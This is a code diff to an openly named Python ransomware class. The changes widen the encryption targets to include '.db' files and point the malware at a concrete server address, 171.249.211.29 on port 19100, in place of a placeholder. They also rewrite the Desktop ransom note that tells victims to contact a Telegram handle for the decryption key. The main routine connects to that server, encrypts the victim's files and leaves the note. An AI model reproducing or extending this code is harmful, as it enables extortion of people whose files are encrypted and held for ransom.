@@ -69,11 +69,13 @@ class Ransomware:
     def Contact(self):
         contact = '''
                     -----------RANSOMWARE-----------
-                    Contact us to recevie the key 
-                    and decryption software !!!
-                    Telegram: @ransomware0182
+                      Contact us to recevie the key 
+                      and decryption software !!!
+                      Telegram: @ransomware0182
                     ---------------------------------
                   '''
+        if os.path.exists(Path.home()/"Desktop"/'ransomware.txt'):
+            os.remove(Path.home()/"Desktop"/'ransomware.txt')
         try:
             with open(Path.home()/"Desktop"/'ransomware.txt', 'w') as file:
                 file.write(contact)
@@ -88,7 +90,7 @@ class Ransomware:
             'images': ['.jpg', '.png', '.gif', '.jpeg'],
             'documents': ['.txt', '.docx', '.md', '.doc', '.pdf', '.xlsx'],
             'others': ['.psd', '.eps', '.cdr', '.ppt', '.mp3', '.wav', '.al', '.mov', '.dmg', '.rar', '.zip', '.mp4', '.xlm'],
-            'code': ['.c', '.cpp', '.cs', '.java', '.py', '.pyc','.js', '.html', '.css', '.php', '.rb', '.swift', '.sql', '.xml', '.json', '.sh', '.bat', '.ps1', '.ts', '.go', '.rs', '.kt']
+            'code': ['.db', '.c', '.cpp', '.cs', '.java', '.py', '.pyc','.js', '.html', '.css', '.php', '.rb', '.swift', '.sql', '.xml', '.json', '.sh', '.bat', '.ps1', '.ts', '.go', '.rs', '.kt']
         }
 
         file_categories = {category: [] for category in exts}
@@ -103,7 +105,7 @@ class Ransomware:
     
     
 if __name__ == '__main__':
-    RanSomWare = Ransomware('Myserver', 19100)
+    RanSomWare = Ransomware('171.249.211.29', 19100)
     RanSomWare.ConnectServer()
     RanSomWare.Encrypted()
     RanSomWare.Contact()
